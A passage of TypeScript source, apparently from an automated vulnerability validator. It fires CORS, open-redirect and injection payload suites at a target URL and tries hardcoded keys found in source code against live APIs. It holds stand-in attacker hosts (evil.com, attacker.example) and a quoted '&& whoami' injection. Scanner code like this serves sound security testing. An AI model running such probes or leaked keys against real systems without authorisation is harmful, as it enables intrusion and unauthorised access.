        return exploitRefuted(
          `Framing is blocked: X-Frame-Options=${xfo}, CSP frame-ancestors=${csp.includes('frame-ancestors') ? 'present' : 'absent'}.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }

      // Info exposure — check for verbose headers, version disclosure
      if (vulnType === 'info_exposure') {
        const exposing: string[] = [];
        if (headers['x-powered-by']) exposing.push(`X-Powered-By: ${headers['x-powered-by']}`);
        if (headers['server'] && !headers['server'].includes('cloudflare')) exposing.push(`Server: ${headers['server']}`);
        if (headers['x-aspnet-version']) exposing.push(`X-AspNet-Version: ${headers['x-aspnet-version']}`);
        if (exposing.length > 0) return exploitConfirmed(
          `Information disclosure confirmed: ${exposing.join(', ')}. Technology fingerprint visible in headers.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
        return exploitRefuted(`No version disclosure in headers. Server header is generic or absent.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }

      // CSRF check — look for CSRF tokens in HTML form
      if (vulnType === 'csrf') {
        const body = await resp.text();
        const hasCsrfToken = body.match(/csrf[_-]?token|_token|authenticity_token|__RequestVerificationToken/i);
        if (!hasCsrfToken) return exploitConfirmed(
          `No CSRF token found in page HTML. Forms are vulnerable to CSRF.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
        return exploitRefuted(`CSRF token found in HTML: ${hasCsrfToken[0]}. Forms are protected.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }

      // Auth bypass — check if endpoint returns data without auth
      if (vulnType === 'auth_bypass') {
        if (resp.status === 200) {
          const body = await resp.text();
          // Strict check: 200 alone is NOT enough. Body must contain data that should be auth-protected.
          // Public pages (login form, marketing, 404 page) returning 200 is NOT an auth bypass.
          const looksProtected = body.includes('unauthorized') || body.includes('login required') ||
            body.includes('please log in') || body.includes('signin required') ||
            body.match(/"userId"|"email"|"balance"|"account"|"private"|"secret"/i);
          if (looksProtected) {
            // Sensitive data returned without auth — real auth bypass
            return exploitConfirmed(
              `Endpoint returned HTTP 200 with sensitive-looking data (userId/email/balance) without auth header. Auth bypass confirmed.`,
              { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
          }
          // 200 but no sensitive data — INCONCLUSIVE (might be a public page, can't tell)
          return inconclusive(
            `Endpoint returned HTTP 200 without auth, but response body does not contain obviously sensitive data. Could be a public page or a real bypass — needs manual verification.`,
            { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
        }
        if (resp.status === 401 || resp.status === 403) {
          return exploitRefuted(`Endpoint requires authentication (HTTP ${resp.status}). Auth bypass not possible.`,
            { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
        }
        // 404, 500, etc. — can't tell
        return inconclusive(`Endpoint returned HTTP ${resp.status}. Cannot determine auth behavior.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }
    } catch (e: any) {
      // Network error — INCONCLUSIVE, not "refuted"
      return inconclusive(`Validation error (network): ${String(e.message || e).slice(0, 200)}`,
        { validationScope: 'theoretical' });
    }
  }

  // ─── CORS: test with multiple origins ──────
  if (vulnType === 'cors_misconfig') {
    const origins = ['https://evil.com', 'https://attacker.example', 'null', 'https://evil.levex.com'];
    let requestsAttempted = 0;
    let requestsSucceeded = 0;
    for (const origin of origins) {
      try {
        requestsAttempted++;
        const resp = await fetch(targetUrl, { headers: { ...BROWSER_HEADERS, 'Origin': origin }, signal: AbortSignal.timeout(8_000) });
        requestsSucceeded++;
        const headers: Record<string, string> = {};
        resp.headers.forEach((v, k) => { headers[k] = v; });
        const acao = headers['access-control-allow-origin'] || '';
        const acac = headers['access-control-allow-credentials'] || '';
        if (acao === '*' && acac === 'true') return exploitConfirmed(
          `CORS misconfiguration CONFIRMED: ACAO=* with ACAC=true. Any origin can read authenticated responses. Origin tested: ${origin}.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status, payload: origin });
        if (acao === origin && acac === 'true') return exploitConfirmed(
          `CORS origin reflection CONFIRMED: server reflected Origin=${origin} with ACAC=true. Any origin is accepted.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status, payload: origin });
        if (acao === 'null' && acac === 'true') return exploitConfirmed(
          `CORS null origin CONFIRMED: ACAO=null with ACAC=true. Sandbox iframe can bypass CORS.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status, payload: origin });
      } catch {}
    }
    // All requests failed — INCONCLUSIVE
    if (requestsSucceeded === 0) return inconclusive(
      `CORS test could not run — all ${requestsAttempted} requests to ${targetUrl} failed (network error or timeout).`,
      { validationScope: 'theoretical', requestUrl: targetUrl });
    // Tests ran, none confirmed misconfig — NOT_EXPLOITABLE
    return exploitRefuted(
      `CORS test completed — ${origins.length} origins tested. No misconfiguration found. ACAO is not * and no origin reflection.`,
      { validationScope: 'target', requestUrl: targetUrl });
  }

  // ─── Open redirect: test with multiple redirect params ──────
  if (vulnType === 'open_redirect') {
    const redirectParams = ['next', 'redirect', 'url', 'return', 'callback', 'goto', 'dest', 'destination', 'continue', 'to'];
    const payloads = ['https://evil.com', '//evil.com', '/\\evil.com', 'https:evil.com'];
    const tests: Promise<any>[] = [];
    for (const param of redirectParams) {
      for (const payload of payloads) {
        for (const method of ['GET', 'POST']) {
          tests.push((async () => {
            const resp = await sendTestRequest(targetUrl, method, payload, param, { followRedirect: false });
            if (resp.status === 0) return { state: 'failed' };
            if (resp.status >= 300 && resp.status < 400) {
              const location = resp.headers['location'] || '';
              if (location.includes('evil.com')) return { state: 'confirmed', param, payload, status: resp.status, location };
            }
            // Also check if body contains the redirect URL (meta refresh, JS redirect)
            if (resp.body.includes('evil.com') && (resp.body.includes('window.location') || resp.body.includes('meta http-equiv'))) {
              return { state: 'confirmed', param, payload, status: resp.status, location: 'body-redirect' };
            }
            return { state: 'no-redirect', status: resp.status };
          })());
        }
      }
    }
    const results = await Promise.allSettled(tests);
    let succeeded = 0;
    for (const r of results) {
      if (r.status === 'fulfilled' && r.value?.state === 'confirmed') {
        return exploitConfirmed(
          `Open redirect CONFIRMED: ${r.value.param}=${r.value.payload} → HTTP ${r.value.status} Location: ${r.value.location}. Server redirects to attacker-controlled domain.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: r.value.status, payload: r.value.payload });
      }
      if (r.status === 'fulfilled' && r.value?.state !== 'failed') succeeded++;
    }
    if (succeeded === 0) return inconclusive(
      `Open redirect test could not run — all ${tests.length} requests to ${targetUrl} failed (network error or timeout).`,
      { validationScope: 'theoretical', requestUrl: targetUrl });
    return exploitRefuted(
      `Open redirect test completed — ${redirectParams.length} params × ${payloads.length} payloads × 2 methods = ${redirectParams.length * payloads.length * 2} requests. No redirect to external domain found.`,
      { validationScope: 'target', requestUrl: targetUrl });
  }

  // ─── API key / secret exposure: 4 distinct verdicts ──────
  if (vulnType === 'api_leak') {
    // Extract the key value from source code
    const keyMatch = sourceCode.match(/(?:api[_-]?key|secret|token|password|private[_-]?key)\s*[=:]\s*['"]([^'"]+)['"]/i);
    if (!keyMatch) {
      // No key literal found in source — INCONCLUSIVE (can't test what we can't see)
      return inconclusive(`No hardcoded key value found in source code to validate. AI flagged this as api_leak but no credential literal was extracted — needs manual review.`,
        { validationScope: 'target', requestUrl: targetUrl });
    }
    const value = keyMatch[1];
    const maskedValue = `${value.slice(0, 3)}***${value.slice(-3)}`;
    const testPatterns = /^(sk-leaked|sk-test|sk-fake|test|example|demo|sample|xxx|your[_-]?api[_-]?key|placeholder|changeme|default|foo|bar|baz|password|secret|token|abc123|12345678)$/i;
    if (testPatterns.test(value) || value.length < 12) {
      // Value matches test/placeholder patterns — NOT_EXPLOITABLE (not a real credential)
      return exploitRefuted(
        `API key value "${maskedValue}" appears to be a TEST/PLACEHOLDER value. Not a real credential — not exploitable.`,
        { validationScope: 'target', requestUrl: targetUrl });
    }
    // Value looks real — try to verify against any API URL found in source
    const apiUrls = sourceCode.match(/https?:\/\/[^\s'"]+\/api\/[^\s'"]+/g) || [];
    if (apiUrls.length === 0) {
      // Key looks real BUT we have no API endpoint to test it against.
      // We CANNOT claim EXPLOITABLE — we never sent an authenticated request that succeeded.
      // We also CANNOT claim NOT_EXPLOITABLE — the key may still be valid.
      // HONEST VERDICT: INCONCLUSIVE.
      return inconclusive(
        `Hardcoded key "${maskedValue}" does not match test patterns — may be real. However, could not verify against an API endpoint (no API URL found in source). SECRET FOUND: YES. CREDENTIAL VALIDATED: NO. EXPLOIT CONFIRMED: NO. Verdict: INCONCLUSIVE — manual verification needed (try the key against the production API).`,
        { validationScope: 'target', requestUrl: targetUrl });
    }
    // Try each API URL
    let anyRequestSucceeded = false;
    for (const apiUrl of apiUrls.slice(0, 3)) {
      try {
        const resp = await fetch(apiUrl, { headers: { ...BROWSER_HEADERS, 'Authorization': `Bearer ${value}` }, signal: AbortSignal.timeout(5_000) });
        anyRequestSucceeded = true;
        if (resp.status === 200) {
          // Key accepted by real API — EXPLOITABLE
          return exploitConfirmed(
            `API key "${maskedValue}" is ACCEPTED by ${apiUrl}. Returned HTTP 200. Real credential confirmed — unauthorized access possible.`,
            { validationScope: 'target', requestUrl: apiUrl, responseStatus: resp.status });
        }
        if (resp.status === 401 || resp.status === 403) {
          // Key rejected by API — NOT_EXPLOITABLE (key is invalid or expired)
          return exploitRefuted(
            `API key "${maskedValue}" was rejected by ${apiUrl} (HTTP ${resp.status}). Key is invalid, expired, or scoped to a different endpoint — not exploitable via this API.`,
            { validationScope: 'target', requestUrl: apiUrl, responseStatus: resp.status });
        }
        // 404, 500, 429, etc. — try next URL
      } catch {}
    }
    // Key looks real, API URLs exist, but none of the requests succeeded
    if (!anyRequestSucceeded) {
      return inconclusive(
        `Hardcoded key "${maskedValue}" may be real, but all ${apiUrls.length} API URL(s) found in source were unreachable (network error or timeout). Cannot determine if key is valid. Verdict: INCONCLUSIVE.`,
        { validationScope: 'theoretical', requestUrl: targetUrl });
    }
    // Requests succeeded but returned non-definitive statuses (404, 500, etc.)
    return inconclusive(
      `Hardcoded key "${maskedValue}" was tested against ${apiUrls.length} API URL(s). Requests succeeded but returned non-definitive statuses (not 200/401/403). Cannot determine if key is valid. Verdict: INCONCLUSIVE.`,
      { validationScope: 'target', requestUrl: targetUrl });
  }

  // ─── postMessage abuse: code pattern detection ──────
  // Note: detecting a listener + sink pattern is NOT the same as exploiting it.
  // We never sent a postMessage and observed XSS execution — so positive findings are INCONCLUSIVE.
  if (vulnType === 'postmessage_abuse') {
    try {
      const resp = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(8_000) });
      const html = await resp.text();
      const hasPostMessage = html.includes('addEventListener') && html.includes('message');
      const hasInnerHTML = html.includes('innerHTML');
      const hasOriginCheck = html.match(/e\.origin|event\.origin|\.origin\s*[!=]==?\s*['"]/);
      if (hasPostMessage && hasInnerHTML && !hasOriginCheck) {
        // Suspicious pattern detected, but NOT actively exploited — INCONCLUSIVE
        return inconclusive(
          `postMessage listener WITHOUT origin check detected on ${targetUrl}. Page has addEventListener('message') + innerHTML sink + no e.origin check. Pattern is EXPLOITABLE IN THEORY, but no postMessage was actually sent to confirm XSS fires. Verdict: INCONCLUSIVE — manual PoC needed (window.open + postMessage with XSS payload).`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }
      if (hasPostMessage && hasOriginCheck) {
        return exploitRefuted(
          `postMessage listener HAS origin check on ${targetUrl}. Cross-origin messages are filtered. Not exploitable.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }
      return exploitRefuted(`No postMessage listener found on ${targetUrl}.`,
        { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
    } catch (e: any) {
      return inconclusive(`Validation error (network): ${String(e.message || e).slice(0, 200)}`,
        { validationScope: 'theoretical' });
    }
  }

  // ─── Business logic: heuristic pattern detection ──────
  // Note: these are SUSPICIOUS PATTERNS, not active exploits.
  // Positive findings are INCONCLUSIVE — they need manual PoC to confirm.
  if (vulnType === 'business_logic') {
    try {
      const resp = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(8_000) });
      const html = await resp.text();
      const findings: string[] = [];
      // Check for client-side price/amount calculation (can be tampered)
      if (html.match(/amount|price|total|balance/i) && html.match(/innerHTML|value\s*=/)) {
        findings.push('Client-side amount/price calculation detected — values may be tamperable');
      }
      // Check for missing rate limiting (login/signup forms)
      if (html.match(/login|signin|signup|register/i) && !html.match(/captcha|recaptcha|hcaptcha/i)) {
        findings.push('Login/signup form without CAPTCHA — brute force possible');
      }
      // Check for hidden form fields with sensitive values
      const hiddenFields = html.match(/<input[^>]+type=['"]hidden['"][^>]+value=['"][^'"]+['"]/gi);
      if (hiddenFields) {
        for (const field of hiddenFields) {
          if (field.match(/amount|price|user|role|admin/i)) {
            findings.push(`Hidden field with sensitive name: ${field.slice(0, 100)}`);
          }
        }
      }
      if (findings.length > 0) {
        // Suspicious patterns found, but NOT actively exploited — INCONCLUSIVE
        return inconclusive(
          `Business logic issues detected on ${targetUrl}: ${findings.join('; ')}. These are HEURISTIC patterns — no exploit was actually executed. Verdict: INCONCLUSIVE — manual PoC needed (e.g. tamper the hidden field, replay the request).`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }
      return exploitRefuted(`No business logic issues detected on ${targetUrl}.`,
        { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
    } catch (e: any) {
      return inconclusive(`Validation error (network): ${String(e.message || e).slice(0, 200)}`,
        { validationScope: 'theoretical' });
    }
  }

  // For payload-based tests (XSS, SQLi, etc): run ALL payloads in PARALLEL
  const mentionedParam = extractParamFromVuln(vuln);
  let candidateParams: string[] = [];
  if (mentionedParam) candidateParams = [mentionedParam];
  else candidateParams = await discoverTargetParameters(targetUrl);

  // ─── AGGRESSIVE FALLBACK (STRICT CLASS-MATCHING) ─────────────────
  // This runs when no specific test suite exists for the claimed vuln type
  // (e.g. IDOR, business_logic, auth_bypass, etc.).
  //
  // POLICY: The fallback can NEVER upgrade the original finding to EXPLOITABLE.
  // If it finds a DIFFERENT vuln class (e.g. XSS while testing an IDOR claim),
  // that's a SEPARATE hypothesis — not a confirmation of IDOR.
  //
  // Possible outcomes:
  //   - Fallback finds a different-class vuln → INCONCLUSIVE (note what was found)
  //   - Fallback runs all tests, none confirm   → NOT_EXPLOITABLE (for the claimed type)
  //   - All requests fail (network)             → INCONCLUSIVE
  //
  // This prevents the bug where "tried && whoami, got 404, body contains 'root'"
  // would upgrade an IDOR finding to EXPLOITABLE for Command Injection.
  if (!testSuite) {
    const allSuites: { name: string; suite: WebTestPayload }[] = [
      { name: 'XSS', suite: XSS_PAYLOADS },
      { name: 'SQLi', suite: SQLI_PAYLOADS },
      { name: 'SSRF', suite: SSRF_PAYLOADS },
      { name: 'OpenRedirect', suite: REDIRECT_PAYLOADS },
      { name: 'CommandInjection', suite: CMDI_PAYLOADS },
      { name: 'PathTraversal', suite: PATH_TRAVERSAL_PAYLOADS },
    ];
    const fallbackTests: Promise<{ suiteName: string; suiteVulnType: string; confirmed: boolean; evidence: string; payload?: string; status?: number; body?: string }>[] = [];
    for (const param of candidateParams) {
      for (const { name, suite } of allSuites) {
        for (const payload of suite.payloads) {
          for (const method of ['GET', 'POST']) {
            fallbackTests.push((async () => {
              const resp = await sendTestRequest(targetUrl, method, payload, param, { followRedirect: true });
              if (resp.status === 0) return { suiteName: name, suiteVulnType: suite.vulnType, confirmed: false, evidence: '' };
              if (suite.check(resp, payload)) return {
                suiteName: name, suiteVulnType: suite.vulnType, confirmed: true,
                evidence: `${name} indicator found: ${suite.evidence(resp, payload)} — ${method} ${targetUrl}?${param}=${payload} (HTTP ${resp.status})`,
                payload, status: resp.status, body: resp.body.slice(0, 500),
              };
              return { suiteName: name, suiteVulnType: suite.vulnType, confirmed: false, evidence: '' };
            })());
          }
        }
      }
    }
    const results = await Promise.allSettled(fallbackTests);

    // Collect any different-class confirmations (for the evidence note)
    const differentClassFindings: string[] = [];
    let anyRequestSucceeded = false;
    for (const r of results) {
      if (r.status === 'fulfilled') {
        if (r.value.confirmed) {
          // A different vuln class was confirmed — but this does NOT confirm
          // the ORIGINAL finding's claimed type. Record it as a note.
          differentClassFindings.push(r.value.evidence);
        }
        if (r.value.suiteName) anyRequestSucceeded = true;
      }
    }

    // If no requests succeeded at all → INCONCLUSIVE
    if (!anyRequestSucceeded) {
      try {
        const probe = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(5_000) });
        anyRequestSucceeded = true;
      } catch {
        anyRequestSucceeded = false;
      }
    }
    if (!anyRequestSucceeded) {
      return inconclusive(
        `[AGGRESSIVE-FALLBACK] All ${fallbackTests.length} payload tests to ${targetUrl} failed (network error or timeout). Cannot determine exploitability for "${vulnType}". Verdict: INCONCLUSIVE.`,
        { validationScope: 'theoretical', requestUrl: targetUrl });
    }

    // If we found a DIFFERENT vuln class, report it but DO NOT upgrade
    // the original finding to EXPLOITABLE.
    if (differentClassFindings.length > 0) {
      return inconclusive(
        `[AGGRESSIVE-FALLBACK] Claimed vuln type: "${vulnType}". No specific test suite exists for this type. Fallback tested 6 other classes (XSS/SQLi/SSRF/Redirect/CmdInjection/PathTraversal) and found indicators of a DIFFERENT class:\n${differentClassFindings.join('\n')}\n\nNOTE: These are NOT confirmations of the claimed "${vulnType}" vulnerability. They are separate hypotheses that should be reported as independent findings. The original "${vulnType}" finding remains UNCONFIRMED. Verdict: INCONCLUSIVE — needs manual verification or a specific test for "${vulnType}".`,
        { validationScope: 'target', requestUrl: targetUrl });
    }

    // All tests ran, none confirmed anything — NOT_EXPLOITABLE for the claimed type
    return exploitRefuted(
      `[AGGRESSIVE-FALLBACK] Ran ${fallbackTests.length} payload tests across ${allSuites.length} suites (XSS/SQLi/SSRF/Redirect/CmdInjection/PathTraversal) × ${candidateParams.length} params × 2 methods against ${targetUrl}. None confirmed for vuln type "${vulnType}". Verdict: NOT_EXPLOITABLE — no payload-based vuln found via automated testing. The claimed "${vulnType}" could not be confirmed (no specific test suite exists for it).`,
      { validationScope: 'target', requestUrl: targetUrl });
  }

  // ─── KNOWN TEST SUITE: run all payloads in parallel ──────────────
  const needsNoRedirect = vulnType === 'open_redirect';
  const allTests: Promise<{ confirmed: boolean; evidence: string; payload?: string; status?: number; body?: string; ran: boolean }>[] = [];

  for (const param of candidateParams) {
    for (const payload of testSuite.payloads) {
      for (const method of ['GET', 'POST']) {
        allTests.push(
          (async () => {
            const resp = await sendTestRequest(targetUrl, method, payload, param, { followRedirect: !needsNoRedirect });
            if (resp.status === 0) return { confirmed: false, evidence: '', ran: false };
            if (testSuite!.check(resp, payload)) return {
              confirmed: true,
              evidence: `[TARGET-VALIDATED] ${testSuite!.evidence(resp, payload)} — ${method} ${targetUrl}?${param}=${payload} (HTTP ${resp.status})`,
              payload, status: resp.status, body: resp.body.slice(0, 500), ran: true,
            };
            // Open redirect: check Location header
            if (needsNoRedirect && resp.status >= 300 && resp.status < 400) {
              const location = resp.headers['location'] || '';
              if (location.includes('evil.com')) return {
                confirmed: true,
                evidence: `[TARGET-VALIDATED] OPEN REDIRECT CONFIRMED: ${method} ${targetUrl}?${param}=${payload} → HTTP ${resp.status} Location: ${location}`,
                payload, status: resp.status, body: resp.body.slice(0, 500), ran: true,
              };
            }
            return { confirmed: false, evidence: '', ran: true };
          })()
        );
      }
    }
  }

  // Wait for ALL tests in parallel
  const results = await Promise.allSettled(allTests);
  let anyRan = false;
  for (const r of results) {
    if (r.status === 'fulfilled' && r.value.confirmed) {
      return exploitConfirmed(r.value.evidence,
        { validationScope: 'target', requestUrl: targetUrl, responseStatus: r.value.status, responseBody: r.value.body, payload: r.value.payload });
    }
    if (r.status === 'fulfilled' && r.value.ran) anyRan = true;
  }

  const totalTests = allTests.length;
  if (!anyRan) {
    return inconclusive(
      `[TARGET-VALIDATION] ${testSuite.name} test could not run — all ${totalTests} requests to ${targetUrl} failed (network error or timeout). Verdict: INCONCLUSIVE.`,
      { validationScope: 'theoretical', requestUrl: targetUrl });
  }
  return exploitRefuted(
    `[TARGET-VALIDATED] ${testSuite.name} test completed — ${totalTests} HTTP requests sent to ${targetUrl} across ${candidateParams.length} params (${candidateParams.join(', ')}). None confirmed. Verdict: NOT_EXPLOITABLE.`,
    { validationScope: 'target', requestUrl: targetUrl });
}

// ═══════════════════════════════════════════════════════════════════
// MAIN ENTRY POINT
// ═══════════════════════════════════════════════════════════════════

export async function activelyValidate(
  sourceCode: string,
  contractName: string,
  vuln: { type: string; title: string; severity: string; description: string; location: string },
  _apiKey?: string,
  _model?: string,
  explicitTargetUrl?: string,
): Promise<ValidationResult> {
  // ─── STEP 0: OBVIOUS VULNERABILITY CHECK ─────────────────────────
  // Some vulns are structurally obvious from source code — the SOURCE→SINK chain
  // is unambiguous and there's no possible sanitizer. Active HTTP testing would
  // add nothing (and for hardcoded keys, could be harmful). Auto-confirm.
  const obvious = checkObviousVulnerability(sourceCode, vuln.type);
  if (obvious.isObvious) {
    return exploitConfirmed(
      `[OBVIOUS — AUTO-CONFIRMED] ${obvious.evidence}\n\nNo active HTTP/cast/Foundry test was run — the source code itself constitutes proof. Verdict: EXPLOITABLE.`,
      { validationScope: 'lab' });
  }

  const isSmartContract = sourceCode.includes('pragma solidity') ||
    sourceCode.includes('contract ') ||
    vuln.type === 'reentrancy' || vuln.type === 'access_control' ||
    vuln.type === 'tx_origin' || vuln.type === 'integer_overflow' ||
    vuln.type === 'unauthorized_mint' || vuln.type === 'flash_loan' ||
    vuln.type === 'delegatecall' || vuln.type === 'governance_hijack';

  const isWebVuln = vuln.type === 'xss' || vuln.type === 'sql_injection' ||
    vuln.type === 'ssrf' || vuln.type === 'open_redirect' ||
    vuln.type === 'command_injection' || vuln.type === 'path_traversal' ||
    vuln.type === 'cors_misconfig' || vuln.type === 'business_logic' ||
    vuln.type === 'csp_missing' || vuln.type === 'api_leak' ||
    vuln.type === 'csrf' || vuln.type === 'auth_bypass' ||
    vuln.type === 'postmessage_abuse' || vuln.type === 'clickjacking' ||
    vuln.type === 'info_exposure' || vuln.type === 'session_fixation';

  if (isSmartContract) {
    const addressMatch = sourceCode.match(/0x[0-9a-fA-F]{40}/) ||
      vuln.location?.match(/0x[0-9a-fA-F]{40}/) ||
      vuln.description?.match(/0x[0-9a-fA-F]{40}/);
    const contractAddress = addressMatch?.[0];
    if (contractAddress) {
      try {
        const targetResult = await validateWithCastOnChain(vuln, contractAddress);
        // Three-state verdict: only continue to Foundry if INCONCLUSIVE
        // EXPLOITABLE → return immediately
        // NOT_EXPLOITABLE → return immediately (refuted on-chain, no need to lab-test)
        // INCONCLUSIVE → fall through to Foundry lab test
        if (targetResult.verdict !== 'INCONCLUSIVE') return targetResult;
      } catch {}
    }
    return validateWithFoundry(sourceCode, contractName, vuln);
  }

  if (isWebVuln) {
    // Use explicit target URL if provided (from analyze-job), otherwise try to extract from description
    const targetUrl = explicitTargetUrl ||
      vuln.location?.match(/https?:\/\/[^\s"'<>]+/)?.[0] ||
      vuln.description?.match(/https?:\/\/[^\s"'<>]+/)?.[0] ||
      sourceCode.match(/https?:\/\/[^\s"'<>]+/)?.[0] ||
      '';
    if (!targetUrl.startsWith('http')) {
      return inconclusive(
        `[UNTESTED] No valid URL found. explicitTargetUrl=${explicitTargetUrl || 'undefined'}, desc=${vuln.description?.slice(0, 100)}. Verdict: INCONCLUSIVE — cannot test without a target URL.`,
        { validationScope: 'theoretical' });
    }
    return validateWebVulnerability(targetUrl, vuln, sourceCode);
  }

  // Fallback: try both
  if (sourceCode.includes('pragma solidity')) return validateWithFoundry(sourceCode, contractName, vuln);
  const fallbackUrl = explicitTargetUrl || sourceCode.match(/https?:\/\/[^\s"'<>]+/)?.[0] || '';
  if (fallbackUrl.startsWith('http')) return validateWebVulnerability(fallbackUrl, vuln, sourceCode);
  return inconclusive(
    `Could not determine test type for "${vuln.type}". Verdict: INCONCLUSIVE — no Solidity code, no URL, no test suite matches.`,
    { validationScope: 'theoretical' });
}
